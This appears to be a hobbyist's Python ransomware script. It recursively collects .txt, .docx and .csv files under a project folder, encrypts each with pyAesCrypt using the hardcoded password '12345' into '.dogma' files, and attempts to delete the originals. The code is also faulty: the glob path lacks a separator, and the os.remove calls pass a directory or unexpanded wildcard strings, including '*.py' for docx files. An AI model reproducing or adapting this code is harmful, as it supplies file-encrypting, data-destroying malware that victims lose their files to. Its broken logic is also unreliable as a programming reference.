import glob
import pyAesCrypt
import os

path = '/home/golcatlman/PycharmProjects/RansomeWare/Encrypted_Data'

txt_files = [txt_f for txt_f in glob.glob(path + "**/*.txt", recursive=True)]
py_files = [py_f for py_f in glob.glob(path + "**/*.docx", recursive=True)]
excel_files = [exl_f for exl_f in glob.glob(path + "**/*.csv", recursive=True)]


bufferSize = 64 * 1024
password = "12345"

for exl_f in excel_files:
    print(exl_f)
    pyAesCrypt.encryptFile(exl_f, exl_f[:-4] + ".dogma",
                           password,
                           bufferSize)
    if exl_f.endswith(".csv"):
        os.remove("/home/golcatlman/PycharmProjects/RansomeWare/Encrypted_Data/", )

for txt_f in txt_files:
    print(txt_f)
    pyAesCrypt.encryptFile(txt_f, txt_f[:-4] + ".dogma",
                           password,
                           bufferSize)
    os.remove("/home/golcatlman/PycharmProjects/RansomeWare/Encrypted_Data/*.txt")

for py_f in py_files:
    print(py_f)
    pyAesCrypt.encryptFile(py_f, py_f[:-4] + ".dogma",
                           password,
                           bufferSize)
    os.remove("/home/golcatlman/PycharmProjects/RansomeWare/Encrypted_Data/*.py")